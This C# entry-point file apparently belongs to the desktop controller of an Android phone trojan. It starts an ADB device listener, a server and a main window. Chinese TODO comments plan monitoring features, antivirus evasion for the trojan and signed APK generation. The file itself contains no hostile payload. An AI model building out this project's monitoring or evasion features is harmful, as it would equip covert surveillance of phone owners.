using System;
using System.Threading.Tasks;
using System.Windows.Forms;
using WangAn.Device.Phone;

namespace IIE.Phone.Troj.Host
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            //TODO:监控类功能添加
            //TODO:木马应用免杀 
            //TODO:安装包生成
            //TODO:签名APK的生成
            //TODO:发送TOAST 中文乱码
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            var config = new Config();
            var log = new Log();
            var adbHandler = new AdbHandler(config, log);
            var deviceManager = new DevicesManager(adbHandler, log);
            new Task(deviceManager.StartListenDevicesChanged).Start();
            var mainView = new MainFrm(config,log, deviceManager);
            Server server;
            try
            {
                server = new Server(config, log, mainView);
            }
            catch
            {
                return;
            }
            
            Application.Run(mainView);
            server.Realse();
        }
    }
}
